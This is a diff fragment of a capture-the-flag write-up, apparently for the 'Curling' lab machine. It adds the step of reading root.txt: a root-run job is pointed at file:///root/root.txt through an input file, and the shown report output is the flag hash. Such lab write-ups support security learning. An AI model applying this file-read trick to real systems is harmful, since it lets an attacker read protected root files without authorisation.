@@ -256,5 +256,10 @@ By editing the file "~/admin-area/input", we can achieve the content of root.txt
 {% highlight shell %}
 floris@curling:~/admin-area$ echo 'url = "file:///root/root.txt"' > input
 
+{% endhighlight %}
 
+Content of root.txt:
+{% highlight shell %}
+floris@curling:~/admin-area$ cat report 
+82c198ab6fc5365fdc6da2ee5c26064a
 {% endhighlight %}
